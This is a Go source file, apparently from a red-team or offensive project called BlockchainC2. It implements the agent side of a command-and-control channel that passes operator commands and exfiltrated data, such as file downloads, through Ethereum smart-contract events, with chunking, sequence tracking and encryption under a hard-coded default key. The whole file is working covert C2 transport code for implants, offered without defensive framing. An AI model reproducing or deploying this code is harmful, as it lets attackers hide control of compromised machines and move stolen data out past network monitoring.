package BlockchainC2

import (
	"blockchainc2/internal/pkg/Utils"
	"encoding/json"
	"fmt"
	"math/big"
	"strings"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
)

// BlockchainClient contains the current state of the agent
type BlockchainClient struct {
	Key             string
	Endpoint        string
	ContractAddress string
	CipherKey       []byte

	// Our BC members
	Client        *ethclient.Client
	Auth          *bind.TransactOpts
	EventC2Client *EventC2
	EventChannel  chan *EventC2ClientData

	// Our Agent members
	AgentID string
	Running bool
	Sleep   int

	Seq       int64
	ClientSeq int64
}

// SendToServer is used to send data via the blockchain onto the controlling server via
// a deployed smart contract
func (bc *BlockchainClient) SendToServer(data string, msgID int, encrypt bool) error {

	// BlockchainC2 header sent with request
	command := BlockchainC2{
		AgentID: bc.AgentID,
		MsgID:   msgID,
		Data:    data,
	}

	// Serialize our command into JSON to be sent over the Blockchain
	bytes, err := json.Marshal(command)
	if err != nil {
		return fmt.Errorf("Error JSON encoding: %v", err)
	}

	splitData := make([]string, 1)

	// Start unencrypted
	rawData := string(bytes)

	// If we are requested to encrypt data, we send this encrypted
	// TODO: Infer this from current state of agent
	if encrypt {
		rawData, err = Utils.SymmetricEncrypt(bytes, bc.CipherKey)
		if err != nil {
			return fmt.Errorf("Error decrypting: %v", err)
		}
	}

	// Due to a length limit on blockchain events, we need to carve up large
	// event responses (such as file downloads) before sending these on to the server
	if len(bytes) > MAX_MSG_LEN {
		// Carve our message up into smaller chunks
		splitData = splitSubN(rawData, MAX_MSG_LEN)
	} else {
		splitData[0] = rawData
	}

	// Iterate through each split block and send each block using a separate transaction
	for i := 0; i < len(splitData); i++ {

		// Check if this is the final block
		f := i+1 == len(splitData)

		// Update SEQ for our transaction
		bc.ClientSeq++

		_, err := bc.EventC2Client.AddServerData(bc.Auth, bc.AgentID, splitData[i], big.NewInt(int64(bc.ClientSeq)), f, encrypt)
		if err != nil {
			return fmt.Errorf("Error sending event via blockchain: %v", err)
		}
	}

	return nil
}

// RecvFromServer will listen for events until a full request has been received before
// returning a Message ID and the body of the request
func (bc *BlockchainClient) RecvFromServer() (int, string) {

	var c2 BlockchainC2
	clientData := ""
	decoded := ""
	var err error

	var newEvent *EventC2ClientData

	// Receive events from blockchain until we have a fully assembled request
	for final := false; final != true; {

		newEvent = <-bc.EventChannel

		// Ensure that this request is actually for us, if not we need to ignore (as we wouldn't be able to decrypt it anyway)
		if bc.AgentID == newEvent.AgentID {

			// Check Seq for the request and make sure this is not a duplicate request from the server
			if newEvent.Seq.Int64() <= bc.Seq {
				continue
			}

			// Update our last seen SEQ
			bc.Seq = newEvent.Seq.Int64()

			// Append this to the client data buffer
			clientData += newEvent.Data

			// Check if this is the final part of a request
			final = newEvent.F
		}
	}

	// Decode the request as plain-text
	decoded = string(clientData)

	// If request is encrypted, update our decoded text with the decrypted version
	if newEvent.Enc {
		decoded, err = Utils.SymmetricDecrypt(string(clientData), bc.CipherKey)
		if err != nil {
			return 0, ""
		}
	}

	// Unserialize a request to its original event state
	if err := json.Unmarshal([]byte(decoded), &c2); err != nil {
		return 0, ""
	}

	return c2.MsgID, c2.Data
}

// SetSessionKey sets a... session key
func (bc *BlockchainClient) SetSessionKey(key []byte) {
	bc.CipherKey = key
}

// CreateBlockchainClient is the entrypoint for a new agent processing events from the blockchain from a server
// key - Keychain in JSON format
// endpoint - JSON-RPC endpoint for processing events
// contractAddress - Address of contract used for fwding/recving events
// agentID - Agent ID to use when communicating with the server
// gasPrice - Gas price to use during transactions (or 0 to let the client decide)
func CreateBlockchainClient(key, password, endpoint, contractAddress, agentID string, gasPrice int64) (*BlockchainClient, error) {

	client := BlockchainClient{
		Key:             key,
		Endpoint:        endpoint,
		ContractAddress: contractAddress,
		CipherKey:       []byte("0123456789012346"),
	}

	// Create blockchain connection
	conn, err := ethclient.Dial(client.Endpoint)
	if err != nil {
		return nil, fmt.Errorf("Error connecting to endpoint: %v", err)
	}

	// Create a new transactopts to allow processing of transactions when sending events
	auth, err := bind.NewTransactor(strings.NewReader(client.Key), password)
	if err != nil {
		return nil, fmt.Errorf("Failed to create authorized transactor: %v", err)
	}

	// Set gas price if provided as a param
	if gasPrice != 0 {
		auth.GasPrice = big.NewInt(gasPrice)
	}

	// Create a new EventC2 handler
	eventc2, err := NewEventC2(common.HexToAddress(client.ContractAddress), conn)
	if err != nil {
		return nil, fmt.Errorf("Failed to create EventC2 instance: %v", err)
	}

	client.Client = conn
	client.Auth = auth
	client.EventC2Client = eventc2
	client.Running = true
	client.AgentID = agentID

	// Set up our event channel for receiving inbound events from the server from the blockchain
	client.EventChannel = make(chan *EventC2ClientData)
	opts := &bind.WatchOpts{}

	// Create our notification channel
	if _, err := eventc2.WatchClientData(opts, client.EventChannel); err != nil {
		return nil, fmt.Errorf("Error watching for events: %v", err)
	}

	return &client, nil
}
